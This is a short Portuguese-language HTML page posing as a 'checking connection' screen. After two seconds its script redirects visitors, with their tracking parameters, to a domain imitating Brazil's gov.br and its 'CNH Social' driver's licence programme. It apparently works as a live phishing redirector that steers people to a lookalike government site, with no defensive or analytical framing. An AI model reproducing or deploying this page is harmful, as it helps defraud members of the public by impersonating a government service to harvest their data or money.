<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Verificando conexão</title>

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f5f5f5;
      color: #333;
      text-align: center;
      padding: 0 20px;
    }

    .container h2 {
      font-size: 3rem; /* texto bem grande */
      margin-bottom: 40px;
    }

    .loader {
      margin: 0 auto;
      width: 100px;      /* loader grande */
      height: 100px;
      border: 8px solid #ccc;
      border-top: 8px solid #333;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Responsivo extra para telas pequenas */
    @media (max-width: 400px) {
      .container h2 {
        font-size: 2.5rem;
      }
      .loader {
        width: 80px;
        height: 80px;
        border-width: 7px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Verificando conexão...</h2>
    <div class="loader"></div>
  </div>

  <script>
    setTimeout(() => {
      const params = window.location.search; // mantém todas as UTMs
      const destino = "https://govbr.cnhsociallbr.online/" + params;
      window.location.href = destino;
    }, 2000); // 2 segundos
  </script>
</body>
</html>
